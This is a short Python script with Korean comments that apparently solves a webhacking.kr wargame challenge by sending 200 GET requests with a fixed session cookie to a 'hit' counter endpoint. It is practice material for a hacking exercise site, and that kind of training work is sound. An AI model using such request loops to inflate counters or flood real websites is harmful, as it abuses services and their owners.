import requests

def send_get_request():
    url = "http://webhacking.kr/challenge/code-5?hit=science4588"
    
    # 최소한의 헤더 설정
    headers = {
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache',
        'Vary': 'Accept-Encoding',
        'Keep-Alive': 'timeout=5, max=100',
        'Connection': 'Keep-Alive',
        'Content-Type': 'text/html; charset=UTF-8'
    }
    
    # 쿠키 설정
    cookies = {
        "PHPSESSID": "i30694d6kqr592s7sqbccl3b2q",
    }

    # GET 요청 보내기
    response = requests.get(url, headers=headers, cookies=cookies)
    
    # 응답 상태 코드 확인
    if response.status_code == 200:
        print("Request successful!")
    else:
        print(f"Request failed with status code: {response.status_code}")

for i in range(200):
    send_get_request()
